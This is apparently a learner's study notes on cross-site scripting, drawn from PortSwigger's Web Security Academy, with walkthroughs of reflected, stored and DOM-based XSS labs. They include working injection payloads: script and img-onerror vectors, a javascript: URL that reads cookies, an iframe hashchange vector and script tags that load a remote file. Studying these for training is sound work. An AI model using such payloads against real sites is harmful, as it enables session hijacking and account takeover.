# Cross-site scripting

In this section, we'll explain what cross-site scripting is, describe the different varieties of cross-site scripting vulnerabilities, and spell out how to find and prevent cross-site scripting.

## What is cross-site scripting (XSS)?

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to<span style="color:rgb(192, 0, 0)"> circumvent the same origin policy</span>, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

## How does XSS work?

Cross-site scripting works by manipulating a vulnerable website so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's **browser**, the attacker can fully compromise their interaction with the application.
![[xss-ports1.png]]
## What are the types of XSS attacks?

There are three main types of XSS attacks. These are:

- [[#Reflected XSS]], where the malicious script comes from the current HTTP request.
- [[#Stored XSS]] where the malicious script comes from the website's database.
- [[#DOM-based XSS]], where the vulnerability exists in client-side code rather than server-side code.



# Reflected XSS

In this section, we'll explain reflected cross-site scripting, describe the impact of reflected XSS attacks, and spell out how to find reflected XSS vulnerabilities.

## What is reflected cross-site scripting?

Reflected cross-site scripting (or XSS) arises when an application **receives data in an HTTP request** and includes that data within the immediate response in an **unsafe way**.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:

`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:

`<p>You searched for: gift</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

This URL results in the following response:

`<p>You searched for: <script>/* Bad stuff here... */</script></p>`

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.
## [laboratory Reflected xss 1](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
![[xss-ports-bal1-1.png]]
![[xss-ports-bal1-2.png]]
 ![[xss-ports-bal1-3.png]]
 we can inject other pyllaods
```html
<img src=x onerror=alert(12)>
<script>alert()</script>
```


- # Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- Perform <span style="color:rgb(192, 0, 0)">any action</span> within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. <span style="color:rgb(192, 0, 0)">These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message.</span> The attack could be targeted directly against a known user, or could be an indiscriminate attack against any users of the application.

The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself.

#### Read more

- [Exploiting cross-site scripting vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)


## How to find and test for reflected XSS vulnerabilities

The vast majority of reflected cross-site scripting vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Testing for reflected XSS vulnerabilities manually involves the following steps:

- **Test every entry point.** Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.
- **Submit random alphanumeric values.** For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. You can use Burp Intruder's [number payloads](https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers) with randomly generated hex values to generate suitable random values. And you can use Burp Intruder's [grep payloads settings](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings#grep-payloads) to automatically flag responses that contain the submitted value.
- **Determine the reflection context.** For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
- **Test a candidate payload.** Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.
- **Test alternative payloads.** If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see [cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- **Test the attack in a browser.** Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in [Burp Proxy's intercept view](https://portswigger.net/burp/documentation/desktop/tools/proxy/intercept-messages), and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like `alert(document.domain)` which will trigger a visible popup within the browser if the attack succeeds.

## Common questions about reflected cross-site scripting

**What is the difference between reflected XSS and stored XSS?** Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.

**What is the difference between reflected XSS and self-XSS?** Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.

# Stored XSS

In this section, we'll explain stored cross-site scripting, describe the impact of stored XSS attacks, and spell out how to find stored XSS vulnerabilities.

## What is stored cross-site scripting?

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```http
POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:

`<p>This post was extremely helpful.</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:

`<script>/* Bad stuff here... */</script>`

Within the attacker's request, this comment would be URL-encoded as:

`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

Any user who visits the blog post will now receive the following within the application's response:

`<p><script>/* Bad stuff here... */</script></p>`

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.

## [Laboratory](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
- open site view a post and comment
- ![[xss-ports-bal2-1.png]]
- again go see post and comments
- ![[xss-ports-bal2-2.png]]
- we see that we comment storeing 
- OK , inject payloads
- `<script>alert(origin)</script>`
- ![[xss-ports-bal2-3.png]]
- and quiet page and Return open post 
- ![[xss-ports-bal2-4.png]]
## Impact of stored XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. The attacker can carry out any of the actions that are applicable to the impact of [reflected XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/reflected).

In terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it.

The self-contained nature of stored cross-site scripting exploits is particularly relevant in situations where an XSS vulnerability only affects users who are currently logged in to the application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is induced to make the attacker's request at a time when they are not logged in will not be compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at the time they encounter the exploit.
#  DOM-based XSS
- example [[xss-skf#XSS DOM]] [[xss-skf#XSS DOM 2]]
- ## What is DOM-based cross-site scripting?
- DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
- To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

- The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

- For a detailed explanation of the taint flow between sources and sinks, please refer to the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page.
## How to test for DOM-based cross-site scripting

The majority of DOM XSS vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually

### Testing HTML sinks

To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` (or `Command+F` on MacOS) to search the DOM for your string.

For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode `location.search` and `location.hash`, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.

### Testing JavaScript execution sinks

Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.

For each potential source, such as `location`, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use `Control+Shift+F` (or `Command+Alt+F` on MacOS) to search all the page's JavaScript code for the source.

Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.

### Testing for DOM XSS using DOM Invader

Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.
## Exploiting DOM XSS with different sources and sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the [list](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities) below for details.

The `document.write` sink works with `script` elements, so you can use a simple payload, such as the one below:

`document.write('... <script>alert(document.domain)</script> ...');`
### [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
- in the laboratory we when search one think a js code called
```js
 function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```
- we can break and fix 
```html
"><img src=x onerror=alert(1)>
'"><script src='http://127.0.0.1/s.js'></script>//
`"><svg onload=alert(1)>`
```

![[xss-ports-bal3-2.png]]
Note, however, that in some situations the content that is written to `document.write` includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload

### [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

![[xss-ports-bal4-1.png]]

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');    document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
	    continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```
- payload
```html
'</select><script src='http://127.0.0.1/s.js'></script>
'</select><img src=x onerror=alert(1)>
'</select><script>alert(1)</script>
```



- The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. For example:

`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`
## [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
 - when we select a city name ..
 - ![[xss-ports-bal4-1.png]]
- This is the code.
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```
- we see if storeId parameter To exist It is placed inside a select tag and an option tag.
- ![[xss-ports-bal4-2.png]]
- ok we have exploit
- ![[xss-ports-bal4-3.png]]
```html
<script>alert(1)</script>
```


###  Sources and sinks in third-party dependencies
- modern web application use's libraries and frameworks, for additional capabilities
- some of these are also potential sources and sinks for DOM XSS. 
#### DOM XSS in jQuery
- look out for sinks that can alter DOM elements on the page. 
- for example:
```js
attr()
```
- function can change the attributes of DOM elements
- f data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.
	- example
```js
$(function() {
$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); 
});
```
- You can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it:

`
```url
?returnUrl=javascript:alert(document.domain)
```
#### [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
- we when submitted a feedback .. 
- this function set a url for back
```js
$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
- ![[xss-ports-bal5-1.png]]
- ![[xss-ports-bal5-2.png]]
- ok let's go exploiting
```js
javascript:alert(documnet.cookie)
```
- ![[xss-ports-bal5-3.png]]
- and click `back`
- ![[xss-ports-bal5-4.png]]

## one more sink jquery  `$()` functions
jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable `hashchange` event handler, similar to the following:

`$(window).on('hashchange', function() { var element = $(location.hash); element[0].scrollIntoView(); });`

As the `hash` is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (`#`). However, you may still find vulnerable code in the wild.

To actually exploit this classic vulnerability, you'll need to find a way to trigger a `hashchange` event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an `iframe`:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
In this example, the `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS vector is appended to the hash, causing the `hashchange` event to fire.

> [!note] Error
> Even newer versions of jQuery can still be vulnerable via the `$()` selector sink, provided you have full control over its input from a source that doesn't require a `#` prefix.
> 

### [Laboratory](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
- I help one [writeup](https://medium.com/@marduk.i.am/dom-xss-in-jquery-selector-sink-using-a-hashchange-event-bb3c355b3633)
- reading writeup  , understanding .
> [!warning] warn
> If you are just looking to solve the lab jump down to the bottom. Look for “SOLUTION”. Solving the lab is very easy and quick. If you want to know how it works, keep reading.
- #### <span style="color:rgb(192, 0, 0)">I didn't fully understand.</span>
# That's all, I'll read the rest later.